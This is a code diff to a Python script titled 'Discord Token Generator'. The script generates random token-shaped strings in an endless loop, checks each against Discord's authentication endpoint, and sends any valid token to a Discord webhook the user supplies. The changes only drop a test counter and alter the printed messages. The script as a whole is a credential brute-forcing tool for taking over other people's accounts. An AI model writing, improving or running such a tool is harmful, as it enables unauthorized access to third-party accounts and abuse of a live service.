@@ -1,5 +1,5 @@
+from Config.Util import *
 from Config.Config import *
-
 import string
 import requests
 import json
@@ -24,18 +24,17 @@ url = 'https://cdn.discordapp.com/attachments/1184160374342299688/11841604390016
 webhook = input(f"{color.RED}\n[?] | Webhook ? (y, n) -> {color.RESET}")
 if webhook in ['y']:
     webhook_url = input(f"{color.RED}[?] | URL Webhook -> {color.RESET}")
-def token_check(token, nombre):
+def token_check(token):
 
     try:
-
         result = requests.get('https://discordapp.com/api/v9/auth/login', headers={'Authorization': token})
         
         
         if webhook in ['y']:
             if result.status_code == 200:
-             print(f"{color.GREEN}[+] | Token Found | {color.WHITE}{token}{color.GREEN} | Tests n°{nombre}{color.RESET}")
+             print(f"{color.GREEN}[+] | Token Found | {color.WHITE}{token}{color.RESET}")
              embed_content = {
-           'title': f'Token Found, Tests n°{nombre}',
+           'title': f'Token Found !',
            'description': f"**__Token:__**\n```{token}```",
            'color': color_webhook,
            'footer': {
@@ -48,17 +47,17 @@ def token_check(token, nombre):
 
 
             else:
-                  print(f"{color.RED}[X] | Token Invalid | {color.WHITE}{token}{color.RED} | Tests n°{nombre}{color.RESET}")
+                  print(f"{color.RED}[x] | Token Invalid | {color.WHITE}{token}{color.RESET}")
         if webhook in ['n']:
              if result.status_code == 200:
-                print(f"{color.GREEN}[+] | Token Found | {color.WHITE}{token}{color.GREEN} | Tests n°{nombre}{color.RESET}")
+                print(f"{color.GREEN}[+] | Token Found | {color.WHITE}{token}{color.RESET}")
              else:
-                  print(f"{color.RED}[X] | Token Invalid | {color.WHITE}{token}{color.RED} | Tests n°{nombre}{color.RESET}")
+                  print(f"{color.RED}[X] | Token Invalid | {color.WHITE}{token}{color.RESET}")
              
 
     except:
-        print(f"{color.RED}[X] | Token Invalid | {color.WHITE}{token}{color.RED} | Tests n°{nombre}{color.RESET}")
-nombre = 0
+        print(f"{color.RED}[X] | Token Invalid | {color.WHITE}{token}{color.RESET}")
+
 while True:
     def generate_random_string(length):
         characters = string.ascii_letters + string.digits + "._"
@@ -66,9 +65,7 @@ while True:
 
     random_string = generate_random_string(random.randint(60, 75))
     
-    nombre += 1
     token = random_string
 
-
-    token_check(token, nombre)
-    Title(f"Discord Token Generator | Tests n°{nombre}")
+    token_check(token)
+    Title(f"Discord Token Generator | Token: {token}")
